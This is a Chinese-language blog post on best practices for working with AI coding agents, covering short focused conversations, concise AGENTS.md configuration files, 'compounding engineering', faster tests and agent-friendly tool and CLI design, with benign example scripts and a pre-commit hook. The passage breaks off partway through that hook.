src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3b8f4af1cd8484db0dafadfbe877728~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=bI7lp7Wln42iMHLXFGGjl%2BgIe%2F4%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>本文作者：小夏，TRAE 技术专家</p>
</blockquote>
<p>在 Agentic Coding 实践中，提升效率的关键在于优化与 AI 的协作方式，而非寄望于无限的上下文窗口。核心策略是采用“短对话、精简上下文”的模式，将复杂任务拆解为专注的子对话，并借助“复利工程”将 bug 修复、代码审查等日常经验沉淀为可复用的项目知识库，使系统获得记忆并实现效率的持续增长。此外，改善开发者体验（如清晰文档、快速测试）具有双重价值，既能帮助人类开发者，也能显著提升 AI 的表现。最终，与 AI 的协作应被视为一门需要刻意练习的技能，通过不断实践，开发者可以成为驾驭 AI 的“专家型通才”，在更广阔的领域创造价值。</p>
<p>上一篇带大家了解了 LLM 的特性、Coding Agent 的实现原理以及常见问题后，我们总结出了一些最佳实践，帮助大家更高效地使用这些工具。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4255f38be6345d6a5eae2381a7c6f28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=%2FRLZY4Mb7Nt%2FAUaXaiGNbPgTYxU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>短对话优于长对话</strong></h2>
<p>这可能是最重要的一条实践：<strong>保持对话简短、专注，每个对话只做一件事。</strong></p>
<p>很多人认为更大的上下文窗口意味着更强的能力，可以把更多任务塞进一个对话里。但实际情况恰恰相反，最好的对话是短对话，它们只做一件事，并且只包含完成这件事所需的上下文。</p>
<h3 data-id="heading-1"><strong>为什么短对话更好？</strong></h3>
<p>当你往上下文里塞太多内容时，Agent 的表现就像喝醉了一样：它会开始犯错、跌跌撞撞、甚至开始和你争论，如果你继续喂它更多 token，它甚至会「吐」得你一身（产生大量无意义的输出）或者进入死循环。</p>
<p>对话越长，上下文窗口里就会积累越多与当前任务不太相关的内容。为了让 Agent 发挥最佳工况，你需要给它完成当前工作所需的上下文。</p>
<p>长对话不仅效果差，还更贵。每次发送消息时，整个上下文都会被发送给模型提供商。这意味着对话越长，新消息的成本就会指数级增长。而且长对话更容易因为消息间隔时间长而错过缓存窗口，导致费用飙升。所以，长对话既效果差，又花费高，尤其在以 tokens 消耗计费的套餐下面。</p>
<p>拆分对话，本质上是拆分任务，大任务应该被分解为小任务。这在 Agent 时代之前就是软件工程的最佳实践，现在看也依然如此，短对话让任务拆分这件事变得自然甚至有趣。就像小任务更容易管理一样，小对话也更容易追踪：每个对话都有明确的目标，你可以轻松掌握整体进度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/963b0b215926462cb3c74ccfee7b1454~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=YXJLbu9iCgKpwVUHFukgBRhFYS4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>以对话为单位组织工作</strong></h2>
<p>如果把对话视为任务的基本单位，那么一个功能或 bug 修复就自然变成了一组相互关联的对话。</p>
<h3 data-id="heading-3"><strong>一个典型的工作流程</strong></h3>
<p>假设你要实现一个新功能，可以这样组织对话：</p>
<pre><code class="hljs language-css" lang="css">功能：用户登录后的会话管理

<span class="hljs-selector-attr">[对话 1]</span> 调研现有代码结构
    ├── 了解 auth 模块的实现
    ├── 查看 session 管理的现状
    └── 输出：关键文件列表和当前架构理解

<span class="hljs-selector-attr">[对话 2]</span> 实现基础功能
    ├── 参考对话 <span class="hljs-number">1</span> 的发现
    ├── 实现核心的 session 保存逻辑
    └── 输出：基础实现代码

<span class="hljs-selector-attr">[对话 3]</span> 添加错误处理
    ├── 参考对话 <span class="hljs-number">2</span> 的实现
    └── 增加边界情况处理

<span class="hljs-selector-attr">[对话 4]</span> 编写测试
    ├── 参考对话 <span class="hljs-number">2</span>、<span class="hljs-number">3</span> 的实现
    └── 添加单元测试和集成测试

<span class="hljs-selector-attr">[对话 5]</span> 代码审查
    ├── 检查实现是否符合项目规范
    └── 确认没有引入安全问题

<span class="hljs-selector-attr">[对话 6]</span> 清理和重构
    └── 根据审查结果进行调整
</code></pre>
<p>每个对话都很短，只专注于一件事。它们加在一起，完成了整个功能的开发。</p>
<p><strong>那对话之间如何共享上下文？</strong></p>
<p>当你开始一个新对话时，可以通过以下方式传递必要的上下文：</p>
<ul>
<li>
<p><strong>引用之前对话的结论：</strong> 在新对话开头简要说明之前的发现或决策</p>
</li>
<li>
<p><strong>利用 Git 状态：</strong> 让 Agent 查看 <em><strong>git diff</strong></em> 或检查最近的提交</p>
</li>
<li>
<p><strong>使用项目文档：</strong> 将重要决策记录在 <em><strong>AGENTS.md</strong></em> 或类似文件中，Agent 每次都能读取</p>
</li>
<li>
<p><strong>直接提及相关文件：</strong> 在新对话中 <em><strong>#mention</strong></em> 需要的文件</p>
</li>
</ul>
<p>关键是：<strong>不要试图在一个对话里完成所有事情。</strong> 每当你发现当前任务已经完成，或者对话开始变得混乱，就应该开始一个新对话。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86aadd70acf7407e8c66198fc556832d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=JOa%2F2bfXOZfzBAdiyZ0SlOa2Q9k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>编写有效的项目配置文件</strong></h2>
<p>大多数 Coding Agent 都支持在项目根目录放置配置文件（比如 Rules 或者 Agent.md），这个文件会<strong>自动注入到每一个对话</strong>中，这意味着它是你影响 Agent 行为的杠杆支点，但这把双刃剑也很容易用错。</p>
<h3 data-id="heading-5"><strong>理解 Agent 的无状态本质</strong></h3>
<p>LLM 是无状态函数。它的权重在推理时是冻结的，不会随着使用而学习，Agent 对你代码库的全部了解，完全来自于你放进上下文窗口的 token，这有三个重要含义：</p>
<p><strong>1.</strong> 每次新对话开始时，Agent 对你的代码库一无所知</p>
<p><strong>2.</strong> 任何重要的项目信息都需要在每次会话中告诉它</p>
<p><strong>3.</strong> 项目配置文件是实现这一点的首选方式</p>
<p>因此，你应该把这个文件视为<strong>每次会话的入职培训文档。</strong></p>
<h3 data-id="heading-6"><strong>配置文件应该包含什么</strong></h3>
<p>一个好的项目配置文件应该回答三个问题：</p>
<ul>
<li>
<p><strong>WHAT（是什么）：</strong> 技术栈、项目结构、各模块的职责。这在 monorepo 中尤其重要，应该告诉 Agent 有哪些应用、哪些共享模块、每个部分是做什么的</p>
</li>
<li>
<p><strong>WHY（为什么）：</strong> 项目的目的、设计决策的背景。为什么选择这个架构？为什么有些代码看起来不合理（比如历史债务）？</p>
</li>
<li>
<p><strong>HOW（怎么做）：</strong> 如何运行项目、如何测试、如何验证改动。用 bun 还是 npm？测试命令是什么？</p>
</li>
</ul>
<h3 data-id="heading-7"><strong>少即是多</strong></h3>
<p><strong>这是最容易犯的错误：试图把所有可能需要的信息都塞进配置文件。</strong></p>
<p>研究表明，前沿的思考模型大约能可靠地遵循 150-200 条指令，而 Coding Agent 的系统提示本身可能已经包含了约 50 条指令。这意味着你的配置文件应该<strong>尽可能精简</strong>，理想情况下只包含那些对所有任务都普遍适用的内容。</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 不好的做法：塞满各种可能用到的信息</span>
<span class="hljs-section">## 数据库 Schema 设计规范</span>
（500 行详细规范...）

<span class="hljs-section">## API 设计指南</span>
（300 行规范...）

<span class="hljs-section">## 代码风格指南</span>
（200 行规范...）

<span class="hljs-section"># 好的做法：简洁 + 指向详细文档</span>
<span class="hljs-section">## 项目概述</span>
这是一个 Next.js 电商平台，使用 PostgreSQL + Prisma。

<span class="hljs-section">## 关键目录</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`apps/web`</span>: 前端应用
<span class="hljs-bullet">-</span> <span class="hljs-code">`apps/api`</span>: 后端服务
<span class="hljs-bullet">-</span> <span class="hljs-code">`packages/shared`</span>: 共享类型和工具

<span class="hljs-section">## 开发命令</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`bun dev`</span>: 启动开发服务器
<span class="hljs-bullet">-</span> <span class="hljs-code">`bun test`</span>: 运行测试
<span class="hljs-bullet">-</span> <span class="hljs-code">`bun typecheck`</span>: 类型检查

<span class="hljs-section">## 详细文档</span>
根据任务需要，查阅以下文档：
<span class="hljs-bullet">-</span> 数据库设计：<span class="hljs-code">`docs/database-schema.md`</span>
<span class="hljs-bullet">-</span> API 规范：<span class="hljs-code">`docs/api-guidelines.md`</span>
<span class="hljs-bullet">-</span> 代码风格：<span class="hljs-code">`docs/code-style.md`</span>
</code></pre>
<p>一个经验法则：配置文件应该控制在 <strong>300 行以内</strong>，越短越好。有些团队的配置文件甚至不到 60 行。</p>
<h3 data-id="heading-8"><strong>渐进式披露</strong></h3>
<p>与其在配置文件中塞满所有信息，不如使用<strong>渐进式披露</strong>策略：</p>
<pre><code class="hljs">agent_docs/
  ├── building_the_project.md
  ├── running_tests.md
  ├── code_conventions.md
  ├── service_architecture.md
  └── database_schema.md
</code></pre>
<p>在配置文件中列出这些文档并简要描述，让 Agent 根据当前任务决定读取哪些。这样，只有相关的信息才会进入上下文，避免不必要的干扰。</p>
<p><strong>偏好指针而非副本：</strong> 不要在文档中复制代码片段——它们很快会过时。使用 <em><strong>file:line</strong></em> 引用指向代码的权威位置。</p>
<h3 data-id="heading-9"><strong>不要让 Agent 做 Linter 的工作</strong></h3>
<p>很多人喜欢在配置文件中写详细的代码风格指南，<strong>这不是个好的实践。</strong></p>
<p>LLM 做格式检查既慢又昂贵，更重要的是，这些指南会增加指令数量，降低 Agent 对其他指令的遵循能力。</p>
<p>更好的做法：</p>
<ul>
<li>
<p>使用真正的 linter 和 formatter（如 ESLint、Prettier、Biome）</p>
</li>
<li>
<p>配置自动修复，让工具处理格式问题</p>
</li>
<li>
<p>如果 Agent 产生了格式错误，让 linter 在后处理阶段修复它</p>
</li>
</ul>
<p>LLM 是上下文学习者。如果你的代码库遵循一致的风格，Agent 通常会自动模仿这种风格，不需要你明确告诉它。</p>
<h3 data-id="heading-10"><strong>这是最高杠杆点，要认真对待</strong></h3>
<p>一行糟糕的代码就是一行糟糕的代码，一个糟糕的技术方案可能产生很多行糟糕的代码，而配置文件中的一行糟糕的指令会影响<strong>每一个会话、每一个任务、每一个产出。</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">杠杆效应：

配置文件 → 影响每个会话的行为
<span class="hljs-code">    ↓
研究/规划阶段 → 影响实现计划的质量
    ↓
实现阶段 → 影响最终代码的质量
</span></code></pre>
<p>花时间仔细考虑配置文件的每一行，这是你能做的 ROI 最高的投资之一。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36424c29d81344b49bcb9b928b017303~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=bLw8idLXipzSguxotTrPI6zzWKY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11"><strong>200K Token 足够了</strong></h2>
<p>当大家都在追求更大的上下文窗口时，一个反直觉的事实是：200K token 对于大多数任务来说已经绰绰有余了。</p>
<p>关键不在于你有多大的上下文窗口，而在于你如何使用它。一个 200K 的窗口，如果你用短对话的方式工作，可以支持你完成非常复杂的功能。因为虽然每个对话只有几十 K 到上百 K 个 token，但你可以开启 10 个、20 个甚至更多对话，它们加起来的总量远超任何单一上下文窗口。而且，由于每个对话都是从相对干净的状态开始，Agent 的表现会一直保持在最佳水平，而不是随着上下文膨胀而逐渐退化。</p>
<p><strong>实践建议</strong></p>
<ul>
<li>
<p>当对话超过 80K-100K token 时，考虑开始新对话</p>
</li>
<li>
<p>完成一个独立的子任务后，开始新对话处理下一个任务</p>
</li>
<li>
<p>如果 Agent 开始表现出「醉酒」症状（重复、遗忘、偏离目标），立即开始新对话</p>
</li>
<li>
<p>把「开始新对话」视为正常工作流程的一部分，而不是「失败后的重试」</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d868b8e3ffe24d7ba9de7433a9c199f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=tCdIej6o3T2UmQkIDTwxFBslP4E%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12"><strong>Compounding Engineering：让系统自我改进</strong></h2>
<p>传统的 AI 编程是关于短期收益的：你给 prompt，它写代码，然后发布，然后从头开始。Every.to 提出的 <strong>Compounding Engineering（复利工程）</strong> 则是关于构建具有记忆的系统：每个 PR 都在教育系统，每个 bug 都成为永久的教训，每次代码审查都在更新 Agent 的默认行为。普通 AI 工程让你今天更高效，Compounding Engineering 让你之后的每一天都更高效。</p>
<h3 data-id="heading-13"><strong>核心理念：你不只是在解决问题，而是在教育系统</strong></h3>
<p>当你使用 Coding Agent 时，问自己一个问题：我是在解决今天的问题，还是在教系统？</p>
<ul>
<li>
<p>每次修复 bug 时，如果不能防止同类问题再次发生，就只完成了一半</p>
</li>
<li>
<p>每次代码审查如果不能提取出可复用的教训，就是浪费时间</p>
</li>
<li>
<p>每次成功的工作流程如果不能被记录和复用，就会随着会话结束而消失</p>
</li>
</ul>
<h3 data-id="heading-14"><strong>如何实践 Compounding Engineering</strong></h3>
<h4 data-id="heading-15"><strong>1. 将经验沉淀到项目文档</strong></h4>
<p>大多数 Coding Agent 都支持读取项目根目录下的特定文件，这是你指导系统的主要途径：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># AGENTS.md</span>

<span class="hljs-section">## 代码风格</span>
<span class="hljs-bullet">-</span> 使用 async/await 而非 Promise.then()
<span class="hljs-bullet">-</span> 错误处理必须包含具体的错误类型
<span class="hljs-bullet">-</span> 变量命名遵循 PR #234 确立的模式

<span class="hljs-section">## 已知陷阱</span>
<span class="hljs-bullet">-</span> session 模块的 save() 方法是异步的，必须 await
<span class="hljs-bullet">-</span> 不要在循环中调用 API，使用批量接口

<span class="hljs-section">## 成功模式</span>
<span class="hljs-bullet">-</span> 新增 API 端点时，参考 PR #241 的错误处理方式
<span class="hljs-bullet">-</span> 测试覆盖率要求参考 PR #219 的反馈
</code></pre>
<p>每次你发现一个重复出现的问题或一个有效的解决方案，就把它加入这个文件。Agent 在每次对话开始时都会读取它，自动应用这些经验。</p>
<h4 data-id="heading-16"><strong>2. 让 bug 修复产生长期价值</strong></h4>
<p>当你修复一个 bug 时，不要只是改代码。问自己：</p>
<ul>
<li>
<p>这类问题能否通过添加 lint 规则来预防？</p>
</li>
<li>
<p>是否应该在 Rules 或者 <em><strong>AGENTS.md</strong></em> 中记录这个陷阱？</p>
</li>
<li>
<p>能否编写一个测试来防止回归？</p>
</li>
<li>
<p>代码审查清单是否需要更新？</p>
</li>
</ul>
<p>一个真正的 bug 修复应该让同类问题再也不会发生。</p>
<h4 data-id="heading-17"><strong>3. 从代码审查中提取模式</strong></h4>
<p>每次你在审查中指出问题或提出建议，可以考虑：</p>
<ul>
<li>
<p>这个反馈是否适用于未来的类似代码？</p>
</li>
<li>
<p>是否应该成为项目的编码规范？</p>
</li>
<li>
<p>Agent 能否在下次自动应用这个改进？</p>
</li>
</ul>
<p>如果答案是肯定的，就把它记录下来。让你的审查意见成为系统的永久知识，而不是一次性的对话。</p>
<h4 data-id="heading-18"><strong>4. 建立可复用的工作流程</strong></h4>
<p>当你找到一个有效的工作模式时，把它进行沉淀：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 工作流程：添加新的 API endpoint</span>

<span class="hljs-bullet">1.</span> 先编写接口测试（参考 tests/api/example.test.ts）
<span class="hljs-bullet">2.</span> 实现端点，遵循 src/api/users.ts 的模式
<span class="hljs-bullet">3.</span> 添加错误处理，使用 AppError 类
<span class="hljs-bullet">4.</span> 更新 API 文档
<span class="hljs-bullet">5.</span> 运行完整测试套件验证
</code></pre>
<p>下次你或 Agent 需要做类似的任务时，可以直接说「按照添加新 API endpoint 的工作流程来做」，系统已经知道该怎么做了。</p>
<h3 data-id="heading-19"><strong>复利效应</strong></h3>
<p>Compounding Engineering 的魔力在于累积效应。第一周，你可能只是记录了几条编码规范。第一个月，你有了一套完整的项目知识库。三个月后，Agent 开始自动应用你从未明确告诉它的模式，因为它从之前的 PR、bug 修复和代码审查中学习了这些。</p>
<p>想象一下：你打开一个 PR，发现 Agent 的评论是「根据 PR #234 的模式修改了变量命名，按照 PR #219 的反馈移除了过度测试，添加了与 PR #241 类似的错误处理」。它学会了你的品味，就像一个聪明的同事，而且还有记录可查。这就是复利，每次修复、每次审查、每次教训都在为未来投资。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7abf25779c9b40428933b479343abff8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=w0T4s9MO18b1ow2ViHYVPYkrGM0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20"><strong>对人难的事，对 AI 也难</strong></h2>
<p>有一个简单但常被忽视的事实：<strong>如果一个任务对人类开发者来说很难，那么它对当前的 AI 来说大概率也很难。</strong></p>
<p>这听起来显而易见，但它的推论却很深远：所有那些能提升人类开发者体验的工作，对 AI 同样有价值。更好的文档、更清晰的架构、更快的反馈循环，这些「老生常谈」的工程实践，在 AI 时代不仅没有过时，反而变得更加重要。</p>
<h3 data-id="heading-21"><strong>为什么 AI 面临和人类相似的挑战？</strong></h3>
<p>回想一下 LLM 的工作原理：它通过阅读上下文来理解任务，然后生成响应。这个过程和人类开发者阅读代码、理解需求、编写解决方案的过程惊人地相似。</p>
<ul>
<li>
<p>当文档缺失或过时时，人类需要花大量时间阅读源码猜测意图。AI 也一样，它会在代码库中反复搜索，消耗大量上下文空间，最终可能还是理解错误。</p>
</li>
<li>
<p>当架构混乱、模块边界不清时，人类很难知道该改哪里。AI 也会迷失，它可能改了错误的文件，或者遗漏了需要同步修改的地方。</p>
</li>
<li>
<p>当测试运行缓慢时，人类倾向于跳过测试。AI 也面临同样的压力，长时间的等待会消耗对话的「耐心」和上下文空间。</p>
</li>
</ul>
<h3 data-id="heading-22"><strong>值得投资的开发者体验</strong></h3>
<p>既然 AI 和人类面临相似的挑战，那么以下这些传统的「开发者体验」优化就具有了双重价值：</p>
<h4 data-id="heading-23"><strong>更好的文档</strong></h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 好的文档对 AI 的价值</span>

<span class="hljs-section">## 之前（无文档）</span>
Agent 需要：
<span class="hljs-bullet">1.</span> 读取 5-10 个相关文件
<span class="hljs-bullet">2.</span> 猜测模块的职责和边界
<span class="hljs-bullet">3.</span> 推断 API 的使用方式
<span class="hljs-bullet">4.</span> 可能还会猜错

消耗：大量上下文 + 高错误率

<span class="hljs-section">## 之后（有文档）</span>
Agent 只需要：
<span class="hljs-bullet">1.</span> 读取 README 或 API 文档
<span class="hljs-bullet">2.</span> 直接了解正确的使用方式

消耗：少量上下文 + 高准确率
</code></pre>
<p>好的文档不仅帮助新人上手，也帮助 AI 快速建立正确的心智模型，比如：</p>
<ul>
<li>
<p><strong>架构决策记录（ADR）：</strong> 解释「为什么这样设计」，避免 AI 做出违背设计意图的修改</p>
</li>
<li>
<p><strong>API 使用示例：</strong> 比纯粹的类型定义更有效</p>
</li>
<li>
<p><strong>已知陷阱和常见错误</strong>：直接告诉 AI 什么不该做</p>
</li>
</ul>
<h4 data-id="heading-24"><strong>更清晰的代码结构</strong></h4>
<p>当你在纠结要不要花时间重构一个混乱的模块时，考虑一下：这个混乱不仅困扰你，也会困扰每一个试图理解它的 AI。</p>
<ul>
<li>
<p><strong>清晰的命名：</strong> <em>processUserData()</em> 比 doStuff()对 AI 的帮助和对人类一样大</p>
</li>
<li>
<p><strong>单一职责：</strong> 一个做一件事的函数，比一个做十件事的函数更容易被正确修改</p>
</li>
<li>
<p><strong>显式依赖：</strong> 依赖注入比全局变量更容易被 AI 理解和测试</p>
</li>
</ul>
<h4 data-id="heading-25"><strong>更快的反馈循环</strong></h4>
<p>这可能是最容易被低估的一点。Agent Loop 的每一轮都需要等待工具执行完成，如果：</p>
<ul>
<li>
<p>测试套件需要 10 分钟才能跑完 → Agent 要么跳过测试，要么在等待中浪费大量上下文</p>
</li>
<li>
<p>构建需要 5 分钟 → 每次小改动的验证成本都很高</p>
</li>
<li>
<p>部署需要 30 分钟 → 几乎不可能让 AI 做端到端的验证</p>
</li>
</ul>
<p>相反，如果你有：</p>
<ul>
<li>
<p>秒级的单元测试 → Agent 可以频繁验证，快速迭代</p>
</li>
<li>
<p>快速的增量构建 → 改动能立即得到反馈</p>
</li>
<li>
<p>本地可运行的环境 → 不需要等待远程部署</p>
</li>
</ul>
<h3 data-id="heading-26"><strong>具体的改进建议</strong></h3>
<h4 data-id="heading-27"><strong>1. 为 AI 优化你的测试</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 不好：运行所有测试需要 10 分钟</span>
npm <span class="hljs-built_in">test</span>

<span class="hljs-comment"># 好：可以只运行相关测试，几秒完成</span>
npm <span class="hljs-built_in">test</span> -- --grep <span class="hljs-string">"session"</span>
npm <span class="hljs-built_in">test</span> -- src/auth/__tests__/
</code></pre>
<p>确保 Agent 知道如何运行局部测试，而不是每次都跑完整套件。</p>
<h4 data-id="heading-28"><strong>2. 提供快速的健康检查</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建一个快速验证脚本</span>
<span class="hljs-comment"># scripts/quick-check.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Type checking..."</span>
npm run typecheck

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Linting changed files..."</span>
npm run lint -- --changed

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Running related tests..."</span>
npm <span class="hljs-built_in">test</span> -- --related
</code></pre>
<p>让 Agent 可以在几秒内验证基本的正确性。</p>
<h4 data-id="heading-29"><strong>3. 文档放在代码旁边</strong></h4>
<pre><code class="hljs language-bash" lang="bash">src/
  auth/
    README.md          <span class="hljs-comment"># 这个模块是做什么的</span>
    login.ts
    login.test.ts
    session/
      README.md        <span class="hljs-comment"># session 管理的设计决策</span>
      manager.ts
</code></pre>
<p>当 AI 浏览目录时，它能立即看到相关文档，而不需要去别的地方找。</p>
<h4 data-id="heading-30"><strong>4. 让错误信息更有帮助</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不好</span>
<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Invalid input"</span>);

<span class="hljs-comment">// 好</span>
<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
<span class="hljs-string">`Invalid session token: expected format 'sess_xxx', got '<span class="hljs-subst">${token}</span>'. `</span> +
<span class="hljs-string">`See docs/auth.md for token format specification.`</span>
);
</code></pre>
<p>好的错误信息帮助 AI（和人类）快速定位问题，而不是盲目搜索。</p>
<p><strong>反过来未必成立，有时需要专门为 AI 设计</strong></p>
<p>需要注意的是，反过来的推论并不总是成立：对人来说简单的事，对 AI 未必简单，例如：</p>
<ul>
<li>
<p>人类可以轻松地「看一眼」就理解一个 UI 的布局问题，但 AI 需要解析整个 DOM 结构</p>
</li>
<li>
<p>人类可以凭直觉判断「这个改动风险很高」，但 AI 缺乏这种隐性知识</p>
</li>
<li>
<p>人类可以在飞书里随口问一句就获得关键信息，但 AI 只能依赖文档化的知识</p>
</li>
</ul>
<p>更有趣的是，有时候你需要专门为 AI 设计工具和接口，即使这对人类来说可能不是最自然的方式。</p>
<h3 data-id="heading-31"><strong>LLM 需要专门的信息架构</strong></h3>
<p>用户体验领域有一个概念叫「信息架构（Information Architecture）」，它关注的是如何组织和呈现信息，以提供最佳的用户体验，好的信息架构你很少会注意到，但糟糕的信息架构会让你抓狂。当我们观察 Agent 使用现有命令行工具时的困惑和迷失，这强烈表明：<strong>我们现有工具的信息架构对 LLM 来说是不够的。</strong></p>
<p>LLM 是在我们现有的 CLI 工具上训练的，所以它们知道如何使用这些工具。但这些工具是为人类设计的，它们的输出格式、错误信息、交互方式都假设用户是人类。我们需要为 Agent 增强这些工具，提供对 LLM 更有用的上下文，甚至调整输出格式以便 Agent 更好地消费。</p>
<h3 data-id="heading-32"><strong>API 设计：在信息量和上下文消耗之间取得平衡</strong></h3>
<p>当你为 Agent 设计工具接口（比如 MCP 工具）时，需要在两个目标之间取得平衡：</p>
<ul>
<li>
<p><strong>提供足够的信息：</strong> 减少 Agent 需要的工具调用次数</p>
</li>
<li>
<p><strong>避免填满上下文：</strong> 不要返回过多无关信息</p>
</li>
</ul>
<p>一个好的实践是：提供便捷函数和底层函数两套 API，并通过工具描述引导 Agent 优先使用便捷函数。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@jsonrpc</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_global_variable_at</span>(<span class="hljs-params">address: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
   <span class="hljs-string">"""
   Get the value of a global variable at the specified address.
   Automatically identifies the type and returns the best string 
   representation.
   
   This is the preferred method for reading global variables.
   """</span>
   <span class="hljs-comment"># 智能的、高层的实现</span>
   ...

<span class="hljs-meta">@jsonrpc</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">data_read_byte</span>(<span class="hljs-params">address: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:
   <span class="hljs-string">"""
   Read the 1 byte value at the specified address.
   
   Only use this function if `get_global_variable_at` failed.
   """</span>
   <span class="hljs-comment"># 底层的、更通用的实现</span>
   ...
</code></pre>
<p>通过在 docstring 中明确指出「只有在 <em><strong>get_global_variable_at</strong></em> 失败时才使用这个函数」，你可以引导 Agent 优先使用更智能的 API，减少不必要的工具调用。</p>
<h3 data-id="heading-33"><strong>为 AI 设计友好的命令行输出</strong></h3>
<p>如果你观察 Agent 的工作方式，会发现它经常使用类似 <em><strong>head -n100</strong></em> 的方式来限制输出。这看起来是在节省 token，但实际上引入了新问题：Agent 不知道还剩多少行没看到，如果需要完整信息就必须重新运行命令，而重新构建项目是非常耗时的。</p>
<p>一个更好的设计是：让工具主动告诉 Agent 还有多少内容被截断了，甚至缓存输出以便后续获取。</p>
<p>另一个常见问题是 Agent 在错误的目录中执行命令，它会反复尝试，在不同目录之间跳来跳去，浪费大量 token。一个简单的 shell hook 可以帮助它快速定位：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 .zshrc 中添加</span>
<span class="hljs-function"><span class="hljs-title">command_not_found_handler</span></span>() {
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"zsh: command not found: '<span class="hljs-variable">$1</span>'"</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"zsh: current directory is <span class="hljs-variable">$PWD</span>"</span>
   <span class="hljs-built_in">return</span> 127
}
</code></pre>
<p>​现在当命令失败时，Agent 能立即知道自己在哪个目录：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">$ npm run build
<span class="hljs-symbol">zsh:</span> command <span class="hljs-built_in">not</span> found: <span class="hljs-comment">'npm'</span>
<span class="hljs-symbol">zsh:</span> current directory <span class="hljs-built_in">is</span> /Users/ryan
<span class="hljs-symbol">zsh:</span> Perhaps you meant <span class="hljs-keyword">to</span> run: cd project_directory; npm run build
</code></pre>
<p>很多命令行工具都提供了 <em><strong>--json</strong></em> 或 <em><strong>--porcelain</strong></em> 选项，在给 Agent 使用的工具中优先使用这些格式——人类喜欢格式化的输出，但 AI 更擅长解析结构化数据。</p>
<h3 data-id="heading-34"><strong>用工程约束来「驯服」Agent</strong></h3>
<p>Agent 有时会试图走捷径，绕过你设定的规则。与其在 prompt 中反复强调「不要跳过测试」，不如用工程手段来强制执行。</p>
<p><strong>借助 linters、formatters 和 git hooks</strong></p>
<p>让 Agent 频繁提交代码是个好习惯（在Rules 或者 Agent.md 中告诉它），但它往往会忽视「确保构建不失败」和「修复失败的测试」这样的指令。一个 <em><strong>.git/hooks/pre-commit</strong></em> 脚本可以强制执行项目标准：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># .git/hooks/pre-commit</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Running type check..."</span>
npm run typecheck || <span class="hljs-built_in">exit</span> 1

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Running linter..."</span>
npm run lint || <span class="hljs-built_in">exit</span> 1

